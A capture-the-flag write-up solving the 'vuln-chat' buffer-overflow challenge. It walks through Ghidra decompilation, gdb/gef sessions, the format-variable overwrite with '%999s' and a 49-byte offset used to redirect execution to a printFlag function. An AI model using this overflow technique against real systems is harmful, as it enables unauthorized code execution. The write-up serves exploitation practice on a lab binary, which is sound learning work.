This challenge was a cool buffer overflow that involved using two overflows to control the instruction pointer. The program uses scanf twice so we use the first one to overflow the format that's used for the second one so we can enter a large number of bytes for the second one. 
First, we can open this in ghidra to understand what's going on
```C

undefined4 main(void)

{
  undefined trust_mess [20];
  undefined user_name [20];
  undefined4 format;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  format = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&format,user_name);
  printf("Welcome %s!\n",user_name);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",user_name);
  __isoc99_scanf(&format,trust_mess);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

This code looks pretty secure in the beginning as for scanf you specify how many bytes to read in. We see that the format variable is 0x73303325 which is the string %30s with endianness swapped. This means that we can write 30 bytes in the format of a string. 
This does not seem like much but looking at the stack layout we see that 30 bytes are more than needed to overwrite this format variable. 


```Assembly
                             **************************************************************
                             *                          FUNCTION                          *
                             **************************************************************
                             undefined4 __cdecl main(void)
             undefined4        EAX:4          <RETURN>
             undefined1        Stack[-0x5]:1  local_5                                 XREF[1]:     080485c5(W)  
             undefined4        Stack[-0x9]:4  format                                  XREF[3]:     080485be(W), 
                                                                                                   080485cd(*), 
                                                                                                   08048630(*)  
             undefined1[20]    Stack[-0x1d]   user_name                               XREF[3]:     080485c9(*), 
                                                                                                   080485d9(*), 
                                                                                                   0804861b(*)  
             undefined1[20]    Stack[-0x31]   trust_mess                              XREF[1]:     0804862c(*)  
                             main                                            XREF[4]:     Entry Point(*), 
                                                                                          _start:08048487(*), 08048830, 
                                                                                          080488ac(*)  
        0804858a 55              PUSH       EBP

```
Our username is 20 bytes long and right after this is the format variable so we just need to write in `0x14 = 0x1d - 0x9` and then we can write in %s99 so for the second scanf we can overflow the instruction pointer. 
The question now is what are we supposed to jump to? Looking through the functions their is one called printFlag and its just running the system on cat flag.txt so that seems like what we want. To get the address of this function we just need to use objectdump to find the location. 


```zsh
~/ctf/nightmare/vu17_vul_chat  objdump -d vuln-chat| grep printFlag
0804856b <printFlag>: 
```

Now the challenge is basically done as we now have a buffer overflow and we have a great function to jump to. Finding the offset is the same as before. We can first enter a recognizable string and then use info frame to see the address of EIP to determine how many more bytes we need. 

```gdb
gef➤  disassemble main
Dump of assembler code for function main:
   0x0804858a <+0>:     push   ebp
   0x0804858b <+1>:     mov    ebp,esp
   0x0804858d <+3>:     sub    esp,0x30
   0x08048590 <+6>:     mov    eax,ds:0x8049a60
   0x08048595 <+11>:    push   0x14
   0x08048597 <+13>:    push   0x2
   0x08048599 <+15>:    push   0x0
   0x0804859b <+17>:    push   eax
   0x0804859c <+18>:    call   0x8048450 <setvbuf@plt>
   0x080485a1 <+23>:    add    esp,0x10
   0x080485a4 <+26>:    push   0x8048714
   0x080485a9 <+31>:    call   0x8048410 <puts@plt>
   0x080485ae <+36>:    add    esp,0x4
   0x080485b1 <+39>:    push   0x8048743
   0x080485b6 <+44>:    call   0x80483e0 <printf@plt>
   0x080485bb <+49>:    add    esp,0x4
   0x080485be <+52>:    mov    DWORD PTR [ebp-0x5],0x73303325
   0x080485c5 <+59>:    mov    BYTE PTR [ebp-0x1],0x0
   0x080485c9 <+63>:    lea    eax,[ebp-0x19]
   0x080485cc <+66>:    push   eax
   0x080485cd <+67>:    lea    eax,[ebp-0x5]
   0x080485d0 <+70>:    push   eax
   0x080485d1 <+71>:    call   0x8048460 <__isoc99_scanf@plt>
   0x080485d6 <+76>:    add    esp,0x8
   0x080485d9 <+79>:    lea    eax,[ebp-0x19]
   0x080485dc <+82>:    push   eax
   0x080485dd <+83>:    push   0x8048759
   0x080485e2 <+88>:    call   0x80483e0 <printf@plt>
   0x080485e7 <+93>:    add    esp,0x8
   0x080485ea <+96>:    push   0x8048766
   0x080485ef <+101>:   call   0x8048410 <puts@plt>
   0x080485f4 <+106>:   add    esp,0x4
   0x080485f7 <+109>:   push   0x1
   0x080485f9 <+111>:   call   0x8048400 <sleep@plt>
   0x080485fe <+116>:   add    esp,0x4
   0x08048601 <+119>:   push   0x804877c
   0x08048606 <+124>:   call   0x8048410 <puts@plt>
   0x0804860b <+129>:   add    esp,0x4
   0x0804860e <+132>:   push   0x80487a4
   0x08048613 <+137>:   call   0x8048410 <puts@plt>
   0x08048618 <+142>:   add    esp,0x4
   0x0804861b <+145>:   lea    eax,[ebp-0x19]
   0x0804861e <+148>:   push   eax
   0x0804861f <+149>:   push   0x80487e6
   0x08048624 <+154>:   call   0x80483e0 <printf@plt>
   0x08048629 <+159>:   add    esp,0x8
   0x0804862c <+162>:   lea    eax,[ebp-0x2d]
   0x0804862f <+165>:   push   eax
   0x08048630 <+166>:   lea    eax,[ebp-0x5]
   0x08048633 <+169>:   push   eax
   0x08048634 <+170>:   call   0x8048460 <__isoc99_scanf@plt>
   0x08048639 <+175>:   add    esp,0x8
   0x0804863c <+178>:   push   0x80487ec
   0x08048641 <+183>:   call   0x8048410 <puts@plt>
   0x08048646 <+188>:   add    esp,0x4
   0x08048649 <+191>:   mov    eax,ds:0x8049a60
   0x0804864e <+196>:   push   eax
   0x0804864f <+197>:   call   0x80483f0 <fflush@plt>
   0x08048654 <+202>:   add    esp,0x4
   0x08048657 <+205>:   mov    eax,0x0
   0x0804865c <+210>:   leave
   0x0804865d <+211>:   ret
End of assembler dump.
gef➤  break *0x08048639
Breakpoint 1 at 0x8048639
gef➤  run
Starting program: /home/ex4722/ctf/nightmare/vu17_vul_chat/vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: eeeeeeeeeeeeeeeeeeee%999s
Welcome eeeeeeeeeeeeeeeeeeee%999s!
Connecting to 'djinn'
--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
eeeeeeeeeeeeeeeeeeee%999s: THISISRECONIZABLE

Breakpoint 1, 0x08048639 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1
$ebx   : 0x0
$ecx   : 0xffffcc00  →  0xf7f9c540  →  0xfbad2288
$edx   : 0xf7f9be1c  →  0x001efd2c
$esp   : 0xffffcc20  →  0xffffcc53  →  "%999s"
$ebp   : 0xffffcc58  →  0x00000000
$esi   : 0x1
$edi   : 0x08048470  →  <_start+0> xor ebp, ebp
$eip   : 0x08048639  →  <main+175> add esp, 0x8
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc20│+0x0000: 0xffffcc53  →  "%999s"       ← $esp
0xffffcc24│+0x0004: 0xffffcc2b  →  "THISISRECONIZABLE"
0xffffcc28│+0x0008: 0x54049a10
0xffffcc2c│+0x000c: "HISISRECONIZABLE"
0xffffcc30│+0x0010: "SRECONIZABLE"
0xffffcc34│+0x0014: "ONIZABLE"
0xffffcc38│+0x0018: "ABLE"
0xffffcc3c│+0x001c: 0x65de3800
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048630 <main+166>       lea    eax, [ebp-0x5]
    0x8048633 <main+169>       push   eax
    0x8048634 <main+170>       call   0x8048460 <__isoc99_scanf@plt>
 →  0x8048639 <main+175>       add    esp, 0x8
    0x804863c <main+178>       push   0x80487ec
    0x8048641 <main+183>       call   0x8048410 <puts@plt>
    0x8048646 <main+188>       add    esp, 0x4
    0x8048649 <main+191>       mov    eax, ds:0x8049a60
    0x804864e <main+196>       push   eax
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln-chat", stopped 0x8048639 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048639 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  search-pattern THISISRECONIZABLE
[+] Searching 'THISISRECONIZABLE' in memory
[+] In '[heap]'(0x804a000-0x806c000), permission=rw-
  0x804a1a0 - 0x804a1bc  →   "THISISRECONIZABLE\nee%999s\n"
[+] In '[stack]'(0xfffdc000-0xffffe000), permission=rw-
  0xffffcc2b - 0xffffcc3c  →   "THISISRECONIZABLE"
gef➤  i f
Stack level 0, frame at 0xffffcc60:
 eip = 0x8048639 in main; saved eip = 0xf7dcaa0d
 Arglist at 0xffffcc58, args:
 Locals at 0xffffcc58, Previous frame's sp is 0xffffcc60
 Saved registers:
  ebp at 0xffffcc58, eip at 0xffffcc5c
## 0xffffcc5c -  0xffffcc2b = 0x31
```
Now we have the offset to the instruction pointer and we can write our exploit.py
This was the smarter way of finding the offset but I am dumb so I use the no brain method of using cyclic to generate a pattern and then dump it into the program and hope it crashes. 

```gdb
gef➤
gef➤  pattern create 60
[+] Generating a pattern of 60 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa
[+] Saved as '$_gef0'
gef➤  run
Starting program: /home/ex4722/ctf/nightmare/vu17_vul_chat/vuln-chat
----------- Welcome to vuln-chat -------------
Enter your username: eeeeeeeeeeeeeeeeeeee%999s
Welcome eeeeeeeeeeeeeeeeeeee%999s!
Connecting to 'djinn'

--- 'djinn' has joined your chat ---
djinn: I have the information. But how do I know I can trust you?
eeeeeeeeeeeeeeeeeeee%999s: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa

Breakpoint 1, 0x08048639 in main ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x1
$ebx   : 0x0
$ecx   : 0xffffcc00  →  0xf7f9c540  →  0xfbad2288
$edx   : 0xf7f9be1c  →  0x001efd2c
$esp   : 0xffffcc20  →  0xffffcc53  →  "kaaalaaamaaanaaaoaaa"
$ebp   : 0xffffcc58  →  "aaamaaanaaaoaaa"
$esi   : 0x1
$edi   : 0x08048470  →  <_start+0> xor ebp, ebp
$eip   : 0x08048639  →  <main+175> add esp, 0x8
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc20│+0x0000: 0xffffcc53  →  "kaaalaaamaaanaaaoaaa"        ← $esp
0xffffcc24│+0x0004: 0xffffcc2b  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
0xffffcc28│+0x0008: 0x61049a10
0xffffcc2c│+0x000c: "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
0xffffcc30│+0x0010: "aaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaa[...]"
0xffffcc34│+0x0014: "aaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaa[...]"
0xffffcc38│+0x0018: "aaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa"
0xffffcc3c│+0x001c: "aaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaa"
──────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8048630 <main+166>       lea    eax, [ebp-0x5]
    0x8048633 <main+169>       push   eax
    0x8048634 <main+170>       call   0x8048460 <__isoc99_scanf@plt>
 →  0x8048639 <main+175>       add    esp, 0x8
    0x804863c <main+178>       push   0x80487ec
    0x8048641 <main+183>       call   0x8048410 <puts@plt>
    0x8048646 <main+188>       add    esp, 0x4
    0x8048649 <main+191>       mov    eax, ds:0x8049a60
    0x804864e <main+196>       push   eax
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln-chat", stopped 0x8048639 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x8048639 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info frame
Stack level 0, frame at 0xffffcc60:
 eip = 0x8048639 in main; saved eip = 0x6e616161
 Arglist at 0xffffcc58, args:
 Locals at 0xffffcc58, Previous frame's sp is 0xffffcc60
 Saved registers:
  ebp at 0xffffcc58, eip at 0xffffcc5c
gef➤  x/s 0xffffcc5c
0xffffcc5c:     "aaanaaaoaaa"
gef➤  pattern search 0xffffcc5c
[+] Searching '0xffffcc5c'
[+] Found at offset 49 (little-endian search) likely
[+] Found at offset 52 (big-endian search)

```
Running the script we get our flag

![image](https://user-images.githubusercontent.com/77011982/123529739-53eceb80-d6c1-11eb-915d-5449e007926a.png)

``flag{g0ttem_b0yz}``
